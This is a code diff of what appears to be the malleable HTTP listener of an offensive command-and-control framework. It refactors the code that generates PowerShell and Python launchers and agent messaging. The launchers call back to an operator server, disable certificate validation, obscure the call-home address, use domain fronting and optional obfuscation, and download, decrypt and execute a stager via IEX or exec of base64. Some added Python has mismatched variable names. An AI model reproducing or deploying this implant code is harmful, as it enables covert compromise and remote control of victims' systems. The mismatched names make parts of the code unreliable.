@@ -7,7 +7,6 @@ import ssl
 import sys
 import time
 import urllib.parse
-from typing import List, Optional, Tuple
 
 from flask import Flask, Response, make_response, request
 from werkzeug.serving import WSGIRequestHandler
@@ -72,7 +71,8 @@ class Listener:
             "Port": {
                 "Description": "Port for the listener.",
                 "Required": True,
-                "Value": 80,
+                "Value": "80",
+                "SuggestedValues": ["80", "443"],
             },
             "Profile": {
                 "Description": "Malleable C2 profile to describe comms.",
@@ -139,7 +139,7 @@ class Listener:
 
         # required:
         self.mainMenu = mainMenu
-        self.threads = {}  # used to keep track of any threaded instances of this server
+        self.thread = None
 
         # optional/specific for this module
         self.app = None
@@ -162,7 +162,7 @@ class Listener:
         """
         return open(f"{self.template_dir }/default.html").read()
 
-    def validate_options(self) -> Tuple[bool, Optional[str]]:
+    def validate_options(self) -> tuple[bool, str | None]:
         """
         Validate all options for this listener.
         """
@@ -262,7 +262,7 @@ class Listener:
         safeChecks="",
         listenerName=None,
         stager=None,
-        bypasses: List[str] = None,
+        bypasses: list[str] = None,
     ):
         """
         Generate a basic launcher for the specified listener.
@@ -272,319 +272,309 @@ class Listener:
             log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        # Previously, we had to do a lookup for the listener and check through threads on the instance.
-        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
-        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
-        if (
-            True
-        ):  # The true check is just here to keep the indentation consistent with the old code.
-            active_listener = self
-            # extract the set options for this instantiated listener
-            listenerOptions = active_listener.options
+        active_listener = self
+        # extract the set options for this instantiated listener
+        listenerOptions = active_listener.options
 
-            port = listenerOptions["Port"]["Value"]
-            host = listenerOptions["Host"]["Value"]
-            launcher = listenerOptions["Launcher"]["Value"]
-            stagingKey = listenerOptions["StagingKey"]["Value"]
+        port = listenerOptions["Port"]["Value"]
+        host = listenerOptions["Host"]["Value"]
+        launcher = listenerOptions["Launcher"]["Value"]
+        stagingKey = listenerOptions["StagingKey"]["Value"]
 
-            # build profile
-            profile = malleable.Profile._deserialize(self.serialized_profile)
-            profile.stager.client.host = host
-            profile.stager.client.port = port
-            profile.stager.client.path = profile.stager.client.random_uri()
+        # build profile
+        profile = malleable.Profile._deserialize(self.serialized_profile)
+        profile.stager.client.host = host
+        profile.stager.client.port = port
+        profile.stager.client.path = profile.stager.client.random_uri()
 
-            if userAgent and userAgent.lower() != "default":
-                if (
-                    userAgent.lower() == "none"
-                    and "User-Agent" in profile.stager.client.headers
-                ):
-                    profile.stager.client.headers.pop("User-Agent")
-                else:
-                    profile.stager.client.headers["User-Agent"] = userAgent
+        if userAgent and userAgent.lower() != "default":
+            if (
+                userAgent.lower() == "none"
+                and "User-Agent" in profile.stager.client.headers
+            ):
+                profile.stager.client.headers.pop("User-Agent")
+            else:
+                profile.stager.client.headers["User-Agent"] = userAgent
 
-            if language == "powershell":
-                launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
+        if language == "powershell":
+            launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
-                if safeChecks.lower() == "true":
-                    launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
+            if safeChecks.lower() == "true":
+                launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                for bypass in bypasses:
-                    launcherBase += bypass
+            for bypass in bypasses:
+                launcherBase += bypass
 
-                if safeChecks.lower() == "true":
+            if safeChecks.lower() == "true":
+                launcherBase += (
+                    "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                )
+
+            # ==== DEFINE BYTE ARRAY CONVERSION ====
+            launcherBase += (
+                f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
+            )
+
+            # ==== DEFINE RC4 ====
+            launcherBase += listener_util.powershell_rc4()
+
+            # ==== BUILD AND STORE METADATA ====
+            routingPacket = packets.build_routing_packet(
+                stagingKey,
+                sessionID="00000000",
+                language="POWERSHELL",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            routingPacketTransformed = profile.stager.client.metadata.transform(
+                routingPacket
+            )
+            profile.stager.client.store(
+                routingPacketTransformed, profile.stager.client.metadata.terminator
+            )
+
+            # ==== BUILD REQUEST ====
+            launcherBase += "$wc=New-Object System.Net.WebClient;"
+            launcherBase += (
+                "$ser="
+                + helpers.obfuscate_call_home_address(
+                    profile.stager.client.scheme + "://" + profile.stager.client.netloc
+                )
+                + ";$t='"
+                + profile.stager.client.path
+                + profile.stager.client.query
+                + "';"
+            )
+
+            # ==== HANDLE SSL ====
+            if profile.stager.client.scheme == "https":
+                # allow for self-signed certificates for https connections
+                launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+
+            # ==== CONFIGURE PROXY ====
+            if proxy and proxy.lower() != "none":
+                if proxy.lower() == "default":
                     launcherBase += (
-                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                        "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                     )
 
-                # ==== DEFINE BYTE ARRAY CONVERSION ====
-                launcherBase += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
-                )
-
-                # ==== DEFINE RC4 ====
-                launcherBase += listener_util.powershell_rc4()
-
-                # ==== BUILD AND STORE METADATA ====
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                routingPacketTransformed = profile.stager.client.metadata.transform(
-                    routingPacket
-                )
-                profile.stager.client.store(
-                    routingPacketTransformed, profile.stager.client.metadata.terminator
-                )
-
-                # ==== BUILD REQUEST ====
-                launcherBase += "$wc=New-Object System.Net.WebClient;"
-                launcherBase += (
-                    "$ser="
-                    + helpers.obfuscate_call_home_address(
-                        profile.stager.client.scheme
-                        + "://"
-                        + profile.stager.client.netloc
+                else:
+                    launcherBase += (
+                        f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
                     )
-                    + ";$t='"
-                    + profile.stager.client.path
-                    + profile.stager.client.query
-                    + "';"
-                )
+                    launcherBase += "$wc.Proxy = $proxy;"
 
-                # ==== HANDLE SSL ====
-                if profile.stager.client.scheme == "https":
-                    # allow for self-signed certificates for https connections
-                    launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-
-                # ==== CONFIGURE PROXY ====
-                if proxy and proxy.lower() != "none":
-                    if proxy.lower() == "default":
-                        launcherBase += (
-                            "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
-                        )
+                if proxyCreds and proxyCreds.lower() != "none":
+                    if proxyCreds.lower() == "default":
+                        launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
-                        launcherBase += (
-                            f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
-                        )
-                        launcherBase += "$wc.Proxy = $proxy;"
-
-                    if proxyCreds and proxyCreds.lower() != "none":
-                        if proxyCreds.lower() == "default":
-                            launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        if len(username.split("\\")) > 1:
+                            usr = username.split("\\")[1]
+                            domain = username.split("\\")[0]
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"
 
                         else:
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            if len(username.split("\\")) > 1:
-                                usr = username.split("\\")[1]
-                                domain = username.split("\\")[0]
-                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"
+                            usr = username.split("\\")[0]
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
 
-                            else:
-                                usr = username.split("\\")[0]
-                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
+                        launcherBase += "$wc.Proxy.Credentials = $netcred;"
 
-                            launcherBase += "$wc.Proxy.Credentials = $netcred;"
+                # save the proxy settings to use during the entire staging process and the agent
+                launcherBase += "$Script:Proxy = $wc.Proxy;"
 
-                    # save the proxy settings to use during the entire staging process and the agent
-                    launcherBase += "$Script:Proxy = $wc.Proxy;"
+            # ==== ADD HEADERS ====
+            for header, value in profile.stager.client.headers.items():
+                # If host header defined, assume domain fronting is in use and add a call to the base URL first
+                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                if header.lower() == "host":
+                    launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
 
-                # ==== ADD HEADERS ====
-                for header, value in profile.stager.client.headers.items():
-                    # If host header defined, assume domain fronting is in use and add a call to the base URL first
-                    # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-                    if header.lower() == "host":
-                        launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
+                launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
 
-                    launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
-
-                # ==== SEND REQUEST ====
-                if (
-                    profile.stager.client.verb.lower() != "get"
-                    or profile.stager.client.body
-                ):
-                    launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
-
-                else:
-                    launcherBase += "$data=$wc.DownloadData($ser+$t);"
-
-                # ==== INTERPRET RESPONSE ====
-                if (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    launcherBase += (
-                        "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
-                    )
-                    launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
-                    launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
-                    launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
-                elif (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    launcherBase += ""
-                else:
-                    launcherBase += ""
-                launcherBase += profile.stager.server.output.generate_powershell_r(
-                    "$data"
-                )
-
-                # ==== EXTRACT IV AND STAGER ====
-                launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
-
-                # ==== DECRYPT AND EXECUTE STAGER ====
-                launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
-
-                if obfuscate:
-                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
-                        launcherBase,
-                        obfuscation_command=obfuscation_command,
-                    )
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
-                ):
-                    return helpers.powershell_launcher(launcherBase, launcher)
-                else:
-                    return launcherBase
-
-            elif language in ["python", "ironpython"]:
-                # ==== HANDLE IMPORTS ====
-                launcherBase = "import sys,base64\n"
-                launcherBase += "import urllib.request,urllib.parse\n"
-
-                # ==== HANDLE SSL ====
-                if profile.stager.client.scheme == "https":
-                    launcherBase += "import ssl\n"
-                    launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
-
-                # ==== SAFE CHECKS ====
-                if safeChecks and safeChecks.lower() == "true":
-                    launcherBase += listener_util.python_safe_checks()
-
-                launcherBase += "server='%s'\n" % (host)
-
-                # ==== CONFIGURE PROXY ====
-                if proxy and proxy.lower() != "none":
-                    if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib.request.ProxyHandler()\n"
-                    else:
-                        proto = proxy.split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib.request.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'})\n"
-                        )
-                    if proxyCreds and proxyCreds != "none":
-                        if proxyCreds == "default":
-                            launcherBase += "o = urllib.request.build_opener(proxy)\n"
-                        else:
-                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "')\n"
-                            )
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
-                    else:
-                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
-                else:
-                    launcherBase += "o = urllib.request.build_opener()\n"
-                # install proxy and creds globaly, so they can be used with urlopen.
-                launcherBase += "urllib.request.install_opener(o)\n"
-
-                # ==== BUILD AND STORE METADATA ====
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="PYTHON",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                routingPacketTransformed = profile.stager.client.metadata.transform(
-                    routingPacket
-                )
-                profile.stager.client.store(
-                    routingPacketTransformed, profile.stager.client.metadata.terminator
-                )
-
-                # ==== BUILD REQUEST ====
-                launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-                launcherBase += "req=vreq('{}', {})\n".format(
-                    profile.stager.client.url,
-                    profile.stager.client.body,
-                )
-                launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
-
-                # ==== ADD HEADERS ====
-                for header, value in profile.stager.client.headers.items():
-                    launcherBase += f"req.add_header('{header}','{value}')\n"
-
-                # ==== SEND REQUEST ====
-                launcherBase += "res=urllib.request.urlopen(req)\n"
-
-                # ==== INTERPRET RESPONSE ====
-                if (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    launcherBase += "head=res.info().dict\n"
-                    launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
-                        profile.stager.server.output.terminator.arg,
-                        profile.stager.server.output.terminator.arg,
-                    )
-                    launcherBase += "a=urllib.parse.unquote(a)\n"
-                elif (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    launcherBase += "a=res.read()\n"
-                else:
-                    launcherBase += "a=''\n"
-                launcherBase += profile.stager.server.output.generate_python_r("a")
-
-                # download the stager and extract the IV
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += listener_util.python_extract_stager(stagingKey)
-
-                if obfuscate:
-                    stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                if encode:
-                    launchEncoded = base64.b64encode(
-                        launcherBase.encode("UTF-8")
-                    ).decode("UTF-8")
-                    if isinstance(launchEncoded, bytes):
-                        launchEncoded = launchEncoded.decode("UTF-8")
-                    launcher = (
-                        "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                        % (launchEncoded)
-                    )
-                    return launcher
-                else:
-                    return launcherBase
+            # ==== SEND REQUEST ====
+            if (
+                profile.stager.client.verb.lower() != "get"
+                or profile.stager.client.body
+            ):
+                launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
 
             else:
-                log.error(
-                    "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+                launcherBase += "$data=$wc.DownloadData($ser+$t);"
+
+            # ==== INTERPRET RESPONSE ====
+            if (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                launcherBase += (
+                    "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                 )
+                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
+                launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
+                launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
+            elif (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                launcherBase += ""
+            else:
+                launcherBase += ""
+            launcherBase += profile.stager.server.output.generate_powershell_r("$data")
+
+            # ==== EXTRACT IV AND STAGER ====
+            launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
+
+            # ==== DECRYPT AND EXECUTE STAGER ====
+            launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+            if obfuscate:
+                launcherBase = self.mainMenu.obfuscationv2.obfuscate(
+                    launcherBase,
+                    obfuscation_command=obfuscation_command,
+                )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            if encode and (
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+            ):
+                return helpers.powershell_launcher(launcherBase, launcher)
+            else:
+                return launcherBase
+
+        elif language in ["python", "ironpython"]:
+            # ==== HANDLE IMPORTS ====
+            launcherBase = "import sys,base64\n"
+            launcherBase += "import urllib.request,urllib.parse\n"
+
+            # ==== HANDLE SSL ====
+            if profile.stager.client.scheme == "https":
+                launcherBase += "import ssl\n"
+                launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
+
+            # ==== SAFE CHECKS ====
+            if safeChecks and safeChecks.lower() == "true":
+                launcherBase += listener_util.python_safe_checks()
+
+            launcherBase += "server='%s'\n" % (host)
+
+            # ==== CONFIGURE PROXY ====
+            if proxy and proxy.lower() != "none":
+                if proxy.lower() == "default":
+                    launcherBase += "proxy = urllib.request.ProxyHandler()\n"
+                else:
+                    proto = proxy.split(":")[0]
+                    launcherBase += (
+                        "proxy = urllib.request.ProxyHandler({'"
+                        + proto
+                        + "':'"
+                        + proxy
+                        + "'})\n"
+                    )
+                if proxyCreds and proxyCreds != "none":
+                    if proxyCreds == "default":
+                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
+                    else:
+                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        launcherBase += (
+                            "proxy_auth_handler.add_password(None,'"
+                            + proxy
+                            + "','"
+                            + username
+                            + "','"
+                            + password
+                            + "')\n"
+                        )
+                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
+                else:
+                    launcherBase += "o = urllib.request.build_opener(proxy)\n"
+            else:
+                launcherBase += "o = urllib.request.build_opener()\n"
+            # install proxy and creds globaly, so they can be used with urlopen.
+            launcherBase += "urllib.request.install_opener(o)\n"
+
+            # ==== BUILD AND STORE METADATA ====
+            routingPacket = packets.build_routing_packet(
+                stagingKey,
+                sessionID="00000000",
+                language="PYTHON",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            routingPacketTransformed = profile.stager.client.metadata.transform(
+                routingPacket
+            )
+            profile.stager.client.store(
+                routingPacketTransformed, profile.stager.client.metadata.terminator
+            )
+
+            # ==== BUILD REQUEST ====
+            launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+            launcherBase += "req=vreq('{}', {})\n".format(
+                profile.stager.client.url,
+                profile.stager.client.body,
+            )
+            launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
+
+            # ==== ADD HEADERS ====
+            for header, value in profile.stager.client.headers.items():
+                launcherBase += f"req.add_header('{header}','{value}')\n"
+
+            # ==== SEND REQUEST ====
+            launcherBase += "res=urllib.request.urlopen(req)\n"
+
+            # ==== INTERPRET RESPONSE ====
+            if (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                launcherBase += "head=res.info().dict\n"
+                launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
+                    profile.stager.server.output.terminator.arg,
+                    profile.stager.server.output.terminator.arg,
+                )
+                launcherBase += "a=urllib.parse.unquote(a)\n"
+            elif (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                launcherBase += "a=res.read()\n"
+            else:
+                launcherBase += "a=''\n"
+            launcherBase += profile.stager.server.output.generate_python_r("a")
+
+            # download the stager and extract the IV
+            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            launcherBase += listener_util.python_extract_stager(stagingKey)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            if encode:
+                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
+                    "UTF-8"
+                )
+                if isinstance(launchEncoded, bytes):
+                    launchEncoded = launchEncoded.decode("UTF-8")
+                launcher = (
+                    "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
+                    % (launchEncoded)
+                )
+                return launcher
+            else:
+                return launcherBase
+
+        else:
+            log.error(
+                "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+            )
 
     def generate_stager(
         self,
@@ -758,8 +748,8 @@ class Listener:
         delay = listenerOptions["DefaultDelay"]["Value"]
         jitter = listenerOptions["DefaultJitter"]["Value"]
         lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
-        killDate = listenerOptions["KillDate"]["Value"]
-        workingHours = listenerOptions["WorkingHours"]["Value"]
+        listenerOptions["KillDate"]["Value"]
+        listenerOptions["WorkingHours"]["Value"]
         b64DefaultResponse = base64.b64encode(
             self.default_response().encode("UTF-8")
         ).decode("UTF-8")
@@ -812,25 +802,16 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay = 60", f"delay = { delay }")
-            code = code.replace("jitter = 0.0", f"jitter = { jitter }")
+            code = code.replace("delay=60", f"delay={ delay }")
+            code = code.replace("jitter=0.0", f"jitter={ jitter }")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                 f'profile = "{ profileStr }"',
             )
-            code = code.replace("lostLimit = 60", f"lostLimit = { lostLimit }")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
                 f'defaultResponse = base64.b64decode("{ b64DefaultResponse }")',
             )
-
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace('killDate = ""', f'killDate = "{ killDate }"')
-            if workingHours != "":
-                code = code.replace(
-                    'workingHours = ""', f'workingHours = "{ workingHours }"'
-                )
 
             if obfuscate:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
@@ -1091,33 +1072,59 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == "python":
-                # Python
-                updateServers = "server = '%s'\n" % (host)
+                sendMessage = f"""
+import base64
+import urllib
+import random
+import sys
 
-                # ==== HANDLE SSL ====
-                if host.startswith("https"):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None\n"
 
-                sendMessage = "def send_message(packets=None):\n"
-                sendMessage += "    global missedCheckins\n"
-                sendMessage += "    global server\n"
-                sendMessage += "    global headers\n"
-                sendMessage += "    global taskURIs\n"
+class ExtendedPacketHandler(PacketHandler):
+    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
+        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
+        self.headers = headers
+        self.taskURIs = taskURIs
+        self.server = server
 
-                sendMessage += "    vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+    def post_message(self, uri, data):
+        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
+
+    def send_results_for_child(self, received_data):
+        self.headers['Cookie'] = "session=%s" % (received_data[1:])
+        taskUri = random.sample({str(profile.post.client.uris)}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
+        return response
+
+    def send_get_tasking_for_child(self, received_data):
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        taskUri = random.sample({str(profile.post.client.uris)}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
+        return response
+
+    def send_staging_for_child(self, received_data, hop_name):
+        postURI = self.server + "/login/process.php"
+        self.headers['Hop-Name'] = hop_name
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
+        return response
+"""
+                sendMessage += "    def send_message(self, packets=None):\n"
+                sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
 
                 # ==== BUILD POST ====
-                sendMessage += "    if packets:\n"
+                sendMessage += "        if packets:\n"
 
                 # ==== BUILD ROUTING PACKET ====
                 sendMessage += (
-                    "        encData = aes_encrypt_then_hmac(key, packets);\n"
+                    "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
                 )
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData);\n"
+                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
                 sendMessage += (
                     "\n".join(
                         [
-                            "        " + _
+                            "            " + _
                             for _ in profile.post.client.output.generate_python(
                                 "routingPacket"
                             ).split("\n")
@@ -1128,74 +1135,86 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                 # ==== CHOOSE URI ====
                 sendMessage += (
-                    "        taskUri = random.sample("
+                    "            taskUri = random.sample("
                     + str(profile.post.client.uris)
                     + ", 1)[0]\n"
                 )
-                sendMessage += "        requestUri = server + taskUri\n"
+                sendMessage += "            requestUri = self.server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
-                sendMessage += "        parameters = {}\n"
+                sendMessage += "            parameters = {}\n"
                 for parameter, value in profile.post.client.parameters.items():
                     sendMessage += (
-                        "        parameters['" + parameter + "'] = '" + value + "'\n"
+                        "            parameters['"
+                        + parameter
+                        + "'] = '"
+                        + value
+                        + "'\n"
                     )
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     sendMessage += (
-                        "        parameters['"
+                        "            parameters['"
                         + profile.post.client.output.terminator.arg
                         + "'] = routingPacket;\n"
                     )
-                sendMessage += "        if parameters:\n"
-                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+                sendMessage += "            if parameters:\n"
+                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.URIAPPEND
                 ):
-                    sendMessage += "        requestUri += routingPacket\n"
+                    sendMessage += "            requestUri += routingPacket\n"
 
                 # ==== ADD BODY ====
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        body = routingPacket\n"
+                    sendMessage += "            body = routingPacket\n"
                 else:
-                    sendMessage += "        body = '" + profile.post.client.body + "'\n"
-                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
+                    sendMessage += (
+                        "            body = '" + profile.post.client.body + "'\n"
+                    )
+                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
 
                 # ==== BUILD REQUEST ====
-                sendMessage += "        req = vreq(requestUri, body)\n"
-                sendMessage += "        req.verb = '" + profile.post.client.verb + "'\n"
+                sendMessage += "            req = vreq(requestUri, body)\n"
+                sendMessage += (
+                    "            req.verb = '" + profile.post.client.verb + "'\n"
+                )
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.post.client.headers.items():
                     sendMessage += (
-                        "        req.add_header('" + header + "', '" + value + "')\n"
+                        "            req.add_header('"
+                        + header
+                        + "', '"
+                        + value
+                        + "')\n"
                     )
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.HEADER
                 ):
                     sendMessage += (
-                        "        req.add_header('"
+                        "            req.add_header('"
                         + profile.post.client.output.terminator.arg
                         + "', routingPacket)\n"
                     )
 
                 # ==== BUILD GET ====
-                sendMessage += "    else:\n"
+                sendMessage += "        else:\n"
 
                 # ==== BUILD ROUTING PACKET
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4);\n"
+                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
                 sendMessage += (
                     "\n".join(
                         [
-                            "        " + _
+                            "            " + _
                             for _ in profile.get.client.metadata.generate_python(
                                 "routingPacket"
                             ).split("\n")
@@ -1206,68 +1225,80 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                 # ==== CHOOSE URI ====
                 sendMessage += (
-                    "        taskUri = random.sample("
+                    "            taskUri = random.sample("
                     + str(profile.get.client.uris)
                     + ", 1)[0]\n"
                 )
-                sendMessage += "        requestUri = server + taskUri;\n"
+                sendMessage += "            requestUri = self.server + taskUri;\n"
 
                 # ==== ADD PARAMETERS ====
-                sendMessage += "        parameters = {}\n"
+                sendMessage += "            parameters = {}\n"
                 for parameter, value in profile.get.client.parameters.items():
                     sendMessage += (
-                        "        parameters['" + parameter + "'] = '" + value + "'\n"
+                        "             parameters['"
+                        + parameter
+                        + "'] = '"
+                        + value
+                        + "'\n"
                     )
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     sendMessage += (
-                        "        parameters['"
+                        "             parameters['"
                         + profile.get.client.metadata.terminator.arg
                         + "'] = routingPacket\n"
                     )
-                sendMessage += "        if parameters:\n"
